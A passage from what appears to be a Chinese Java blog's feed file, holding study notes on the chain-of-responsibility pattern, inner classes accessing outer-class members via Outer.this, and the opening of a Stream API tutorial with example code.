&#123;<br>         System.out.println(<span class="hljs-string">&quot; 请求编号 id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; 被 &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; 处理&quot;</span>);<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>         approver.processRequest(purchaseRequest);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">请求编号 id<span class="hljs-operator">=</span> <span class="hljs-number">1</span> 被 佟校长 处理<br>请求编号 id<span class="hljs-operator">=</span> <span class="hljs-number">1</span> 被 佟校长 处理<br>请求编号 id<span class="hljs-operator">=</span> <span class="hljs-number">2</span> 被 李院长 处理<br>请求编号 id<span class="hljs-operator">=</span> <span class="hljs-number">2</span> 被 李院长 处理<br></code></pre></td></tr></table></figure><h2 id="职责链模式的注意事项和细节"><a class="markdownIt-Anchor" href="#职责链模式的注意事项和细节"></a> 职责链模式的注意事项和细节</h2><ol><li><p>将请求和处理分开，实现解耦，提高系统的灵活性</p></li><li><p>简化了对象，使对象不需要知道链的结构</p></li><li><p>性能会受到影响，特别是在<strong>链比较长的时候</strong>，因此需控制链中最大节点数量，一般通过在 Handler 中设置一个最大节点数量，在 setNext()方法中判断是否已经超过阀值，超过则不允许该链建立，避免出现超长链无意识地破坏系统性能</p></li><li><p>参考笔记：</p><ul><li><a href="https://www.runoob.com/design-pattern/design-pattern-tutorial.html">菜鸟教程设计模式</a></li><li><a href="https://www.bilibili.com/video/BV1G4411c7N4?p=148&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">尚硅谷Java设计模式（图解+框架源码剖析）笔记资料</a></li></ul></li><li><p>学习视频</p><ul><li><a href="https://www.bilibili.com/video/BV1G4411c7N4?p=148&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">尚硅谷Java设计模式（图解+框架源码剖析</a></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>设计模式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>设计模式</tag>
      
      <tag>进阶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Java内部类中使用外部类的成员方法以及成员变量</title>
    <link href="/2023/01/04/%E5%9C%A8Java%E5%86%85%E9%83%A8%E7%B1%BB%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E4%BB%A5%E5%8F%8A%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F/"/>
    <url>/2023/01/04/%E5%9C%A8Java%E5%86%85%E9%83%A8%E7%B1%BB%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E4%BB%A5%E5%8F%8A%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="在java内部类中使用外部类的成员方法以及成员变量"><a class="markdownIt-Anchor" href="#在java内部类中使用外部类的成员方法以及成员变量"></a> 在Java内部类中使用外部类的成员方法以及成员变量</h1><p>众所周知，在定义成员方法或者成员变量的时候，可以给其加上一些权限的修饰词，以防止其他类的访问。如在成员变量或者成员方法前面，加上<code>Private</code>关键字，则其他类就无法调用这个类中的成员方法或则和成员变量。但是，如果这个类有成员内部类，则不受这方面的限制。也就是说，在成员内部类中可以随意引用外部类的成员方法以及成员变量，即使这些类成员方法或者成员变量被修饰了<code>private</code>.如在成员外部类中定义了一个i变量，并且利用<code>private</code>关键字来修饰。此时在其他类中是不能够引用这个私有成员变量的。但是这个类的成员内部类的方法中，则不仅可以引用这个外部类的私有变量，而且还可以对其进行赋值等操作。这个赋值操作对于外部类也是有效的。即成员内部类可以更改外部类中私有变量的值。（深入理解嵌套类和内部类）</p><p><strong>要在外部类中实例化内部类对象的引用。</strong></p><p>如果一个类定义在另外一个类中，成为成员内部类，此时一定要注意，内部类的实例一定要绑定在Java外部类的实例上。（如何在内部类中返回外部类对象）也就是说，要从外部类中初始化一个内部类的对象，此时内部类的对象就会绑定在外部类的对象上。这跟普通的类有所不同。普通的类，创建完之后，不一定马上需要实例化。在需要用到这个对象的时候，再进行实例化即可。但是，如果一个类成为另外一个类的成员内部类，则就不同了。必须要在外部类中实例化内部类对象的引用，以实现将内部类的实例绑定在外部类的实例上。简单的说，就是在定义外部类的时候，如果有成员内部类，那么就不要忘了在外部类中利用<code>new</code>关键字来实例化内部类对象的引用。而对于外部类来说，则可以在需要的时候再进行实例化。如此就可以保证，利用外部类创建对象的同时创建了内部类的对象。从而可以保证Java内部类的实例绑定在外部类的实例上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * **要在外部类中实例化内部类对象的引用。**</span><br><span class="hljs-comment"> * [demo02]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/4 10:23]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">1818</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoyxtwoy&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> getA();<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoy&quot;</span>;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;A&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                    <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在外部类中利用new关键字来实例化内部类对象的引用</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> demo02.Demo01.A</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    A <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priA</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(a);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Demo01&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, a=&quot;</span> + a +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">test01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Demo01</span> <span class="hljs-variable">demo01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo01</span>();<br>        demo01.priA();<br>        System.out.println(demo01);<br>        System.out.println(demo01.a);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>成员内部类中成员方法与成员变量的私有性。</strong></p><p>作为成员内部类，可以随意引用外部类中的成员变量与成员方法。那么在成员内部类中定义的成员变量，外部类是否也可以随意访问呢？答案是否定的。内部类可以访问它外部类的成员，但是内部类的成员（如成员变量或者成员方法）只有在内部类的范围之内是可知的，不能够被外部类直接引用。如现在在外部类中定义了一个变量<code>i</code>，在内部类中定义了另一个变量<code>ii</code>.此时在成员内部类中，可以直接引用这个外部类中的变量i，也可以对其直接进行赋值，如i=5等等。但是在外部类中，则不能够直接引用内部类中的成员变量。如在外部类中，利用ii=5的赋值语句改变这个变量的值，就属于语法错误，在编译的时候就会出现错误。如果外部类真的要引用内部类的成员，那也不是不可以。只是不能够进行直接的引用，而是要使用内部类对象引用的方法才能够调用内部类的成员变量。这一点程序开发人员需要切记。成员内部类与外部类相互访问彼此的成员方法限制是不同的。特别需要注意的是，如果在外部类和非静态方法之外实例化内部对象，则需要使用外部类。内部类的形式来制定这个对象的类型。这非常的麻烦。为此要尽量避免在外部类和非静态方法之外实例化内部类对象。再者，内部类对象会依赖于外部类对象，除非已经存在一个外部类对象，否则类中不会出现内部类对象。简单的说，内部类对象与外部类对象之间的关系非常的紧密。有时候即像一对父子（成员内部类可以随意使用外部类的成员），有时候又像是陌生人（外部类不能够直接使用内部类中的成员）。作为一个出色的程序开发人员，必须要深入了解外部类对象与内部类对象的关系。因为在实际工作中，在外部类中定义成员内部类还是很常见的。只有了解他们彼此之间的关系，在编写应用程序中，才可以把控好他们。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * **要在外部类中实例化内部类对象的引用。**</span><br><span class="hljs-comment"> * [demo02]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/4 10:23]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">1818</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoyxtwoy&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> getA();<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">ageA</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nameA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoy&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">ii</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 直接使用并重新赋值外部类的成员变量</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">         * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priI</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(i);<br>            i = <span class="hljs-number">5</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;A&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;ageA=&quot;</span> + ageA +<br>                    <span class="hljs-string">&quot;, nameA=&#x27;&quot;</span> + nameA + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, ii=&quot;</span> + ii +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">      * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priSexByA</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">//        priI(); //编译错误</span><br>        a.priI();<br>        System.out.println(<span class="hljs-string">&quot;使用priI之后的I=》&quot;</span> + i);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priII</span><span class="hljs-params">()</span> &#123;<br>        System.out.println();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在外部类中利用new关键字来实例化内部类对象的引用</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> demo02.Demo01.A</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    A <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priA</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(a.ageA);<br>        System.out.println(a.nameA);<br>        System.out.println(a.ii);<br>        <span class="hljs-comment">//一下全部出现编译错误</span><br><span class="hljs-comment">//        System.out.println(ageA);</span><br><span class="hljs-comment">//        System.out.println(nameA);</span><br><span class="hljs-comment">//        System.out.println(ii);</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Demo01&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, a=&quot;</span> + a +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>使用this关键字获取内部类与外部类对象的引用。</strong></p><p>在外部类和成员内部类中，都可以定义变量。成员内部类可以随意访问外部类中的变量，而外部类不能够直接访问内部类中的变量，只有通过使用内部类对象来引用内部类的成员变量。不过需要注意的是，在外部类中定义的变量与内部类中定义的变量名字可以相同。也就是说，在外部类中可以定义一个变量i，在内部类中也可以定义一个变量i。此时新的问题就出来了。由于在内部类中可以随意访问外部类中成员方法与成员变量。但是此时成员内部类与外部类的变量名相同，那么如果要在内部类使用这个变量i，编译器怎么知道现在需要调用外部类的变量i，还是内部类的变量i呢？</p><p>在实际工作中，应该尽量避免这种情况。即在定义变量名字的时候，Java内部类中的变量名字尽量不要与外部类中的变量名字相同。但是如果真的发生这种情况的话，Java编译器还是有手段可以解决这个变量名字的冲突问题。如果在类中的成员内部类中遇到成员变量名字与外部类中的成员变量名字相同，则可以通过使用this关键字来加以区别。如现在有一个类名字叫做<code>Demo01</code>.而在这个类中又创建了一个成员内部类，名字叫做<code>age</code>.现在在这两个类中各自定义了一个成员变量i，用来做循环之用。此时如果在成员内部类中调用这个变量，该如何进行区分呢？通常情况下，如果使用this.i的方式来调用变量，则表示这个变量是成员内部类中定义的变量。而通过使用<code>Demo01.this.i</code>的形式调用变量时表示此时引用的是外部类的成员变量。也就是说，如果内部类中引用外部类中同名的成员，需要通过外部类迷名字。<code>this.</code>外部类成员名字的方式加以引用。而且，在引用成员内部类自己的定义的成员时也需要使用this关键字，以加以区别。显然这非常的麻烦。为此笔者仍然要强调一遍，除非有非常特殊的必要，否则的话要尽量避两外部类与成员内部类中成员变量或者成员方法采用相同的名字。否则的话，会给后续的引用带来很大的麻烦。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * **要在外部类中实例化内部类对象的引用。**</span><br><span class="hljs-comment"> * [demo02]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/4 10:23]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">1818</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoyxtwoy&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> getA();<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nameA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoy&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">ii</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>       <span class="hljs-keyword">void</span> <span class="hljs-title function_">priAges</span><span class="hljs-params">()</span>&#123;<br>           System.out.println(age);<br>           System.out.println(<span class="hljs-built_in">this</span>.age);<br>           System.out.println(Demo01.<span class="hljs-built_in">this</span>.age);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priAges</span><span class="hljs-params">()</span>&#123;<br>        a.priAges();<br>    &#125;<br><br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在外部类中利用new关键字来实例化内部类对象的引用</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> demo02.Demo01.A</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    A <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104111600040.png" alt="image-20230104111600040" /></p><p>在<code>ArrayList</code>源码中通过<code>类名.this.成员变量名</code>使用外部类的成员变量。内部类是<code>Itr</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104112240678.png" alt="image-20230104112240678" /></p><p>在外部类之外使用内部类成员变量，内部类的成员变量与方法全部被隐藏起来。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104112026176.png" alt="image-20230104112026176" /></p><p>从以上的总结中可以看出，成员内部类与外部类之间的关系确实很复杂。作为一个Java程序开发人员，必须要了解内部类与外部类成员相互之间引用的准则、内部类对象与外部类对象的关系。在编写代码的时候，尽量避免内部类与外部类中成员变量与成员方法的命名冲突。如果真的发生重名的话，要学会利用this关键字来消除这个冲突。笔者上面谈的一些注意实现也是一些比较抽象的内容，需要开发人员在实际工作中去领悟。</p><p>参考<a href="https://blog.csdn.net/caolaosanahnu">caolaosanahnu</a><a href="https://blog.csdn.net/caolaosanahnu/article/details/19486615">在Java内部类中使用外部类的成员方法以及成员变量</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>基础</tag>
      
      <tag>内部类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数式编程-Stream流</title>
    <link href="/2022/12/21/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/12/21/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="函数式编程-stream流"><a class="markdownIt-Anchor" href="#函数式编程-stream流"></a> 函数式编程-Stream流</h1><h2 id="1-概述"><a class="markdownIt-Anchor" href="#1-概述"></a> 1. 概述</h2><h3 id="11-为什么学"><a class="markdownIt-Anchor" href="#11-为什么学"></a> 1.1 为什么学？</h3><ul><li>能够看懂公司里的代码</li><li>大数量下处理集合效率高</li><li>代码可读性高</li><li>消灭嵌套地狱</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//查询未成年作家的评分在70以上的书籍 由于洋流影响所以作家和书籍可能出现重复，需要进行去重</span><br>List&lt;Book&gt; bookList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>Set&lt;Book&gt; uniqueBookValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>Set&lt;Author&gt; uniqueAuthorValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br><span class="hljs-keyword">for</span> (Author author : authors) &#123;<br>    <span class="hljs-keyword">if</span> (uniqueAuthorValues.add(author)) &#123;<br>        <span class="hljs-keyword">if</span> (author.getAge() &lt; <span class="hljs-number">18</span>) &#123;<br>            List&lt;Book&gt; books = author.getBooks();<br>            <span class="hljs-keyword">for</span> (Book book : books) &#123;<br>                <span class="hljs-keyword">if</span> (book.getScore() &gt; <span class="hljs-number">70</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (uniqueBookValues.add(book)) &#123;<br>                        bookList.add(book);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>System.out.println(bookList);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Book&gt; collect = authors.stream()<br>    .distinct()<br>    .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">18</span>)<br>    .map(author -&gt; author.getBooks())<br>    .flatMap(Collection::stream)<br>    .filter(book -&gt; book.getScore() &gt; <span class="hljs-number">70</span>)<br>    .distinct()<br>    .collect(Collectors.toList());<br>System.out.println(collect);<br></code></pre></td></tr></table></figure><h3 